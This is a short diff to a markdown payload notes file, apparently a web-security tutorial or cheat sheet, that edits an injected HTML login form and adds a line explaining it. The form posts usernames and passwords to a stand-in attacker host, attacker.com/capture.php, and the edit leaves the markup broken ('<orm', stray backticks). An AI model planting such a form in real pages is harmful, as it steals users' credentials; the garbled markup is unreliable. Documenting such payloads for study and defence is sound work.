@@ -3,8 +3,11 @@
 
 Payloads 
 
-<```form method='POST' action='http://attacker.com/capture.php' id='loginform'>
+```<orm method='POST' action='http://attacker.com/capture.php' id='loginform'>
 <input type='text' name='username' value=''>
 <input type='password' name='password' value=''>
 <input type='submit' value='submit'>
 </form>```
+When a user submits this form, the information is sent to an
+attacker’s website http://<attacker>.com/capture.php via an action attribute
+➊.
